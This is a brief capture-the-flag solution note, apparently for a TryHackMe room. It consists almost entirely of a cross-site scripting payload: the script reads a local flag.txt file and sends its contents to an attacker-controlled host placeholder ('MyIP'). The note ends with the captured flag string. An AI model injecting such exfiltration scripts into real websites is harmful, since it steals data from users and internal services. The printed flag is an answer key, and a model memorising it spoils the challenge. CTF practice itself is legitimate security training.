xss payload:
<script>
fetch('http://127.0.0.1:8080/flag.txt')
.then(response => response.text())
.then(text => {
  fetch("http://MyIP:8080/?data=" + text);
});
</script>

flag >> THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D
